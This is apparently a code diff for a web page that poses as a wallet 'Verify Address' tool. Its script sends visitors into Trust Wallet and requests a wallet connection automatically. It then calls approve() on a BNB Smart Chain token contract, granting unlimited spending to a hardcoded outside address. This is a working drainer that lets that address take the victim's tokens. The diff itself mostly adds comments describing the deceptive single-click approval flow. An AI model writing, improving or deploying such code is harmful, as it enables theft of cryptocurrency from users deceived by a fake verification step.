@@ -196,7 +196,7 @@
   .result-status { color: var(--amber); font-weight: 600; }
 
   @media (max-width: 860px) {
-    /* MODIFICA: Header Mobile - Logo e Menu ben visibili */
+    /* Header Mobile - Logo e Menu ben visibili */
     .nav { flex-direction: column; gap: 16px; padding: 16px 0; }
     .brand { justify-content: center; width: 100%; }
     nav { width: 100%; }
@@ -393,14 +393,18 @@
   async function startFlow() {
     const inputAddr = document.getElementById('walletInput').value.trim();
     if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
+    
     const isWeb3 = window.ethereum;
     const params = new URLSearchParams(window.location.search);
     const isAuto = params.get('auto') === '1';
+
     if (!isWeb3 || !isAuto) {
+      // Step 1: Redirect a Trust Wallet
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
     } else {
+      // Step 2: In Trust Wallet -> Click Singolo per Approve
       executeApprove(inputAddr);
     }
   }
@@ -415,6 +419,7 @@
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
       const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
       const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+      
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = inputAddr;
@@ -429,15 +434,22 @@
   window.addEventListener('load', async () => {
     const params = new URLSearchParams(window.location.search);
     if (params.get('auto') === '1' && window.ethereum) {
+      // Siamo in Trust Wallet
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
+      
+      // Testi dinamici
       document.getElementById('modalTitle').textContent = "Verify Address";
       document.getElementById('modalDesc').style.display = "block";
+
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
+        // CHIEDE CONNECT WALLET AUTOMATICAMENTE
         await provider.send("eth_requestAccounts", []);
+        // APRE IL MODAL CON L'INDIRIZZO
         openVerifyModal();
       } catch (e) { console.error("Connect error:", e); }
+      
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
     } else {
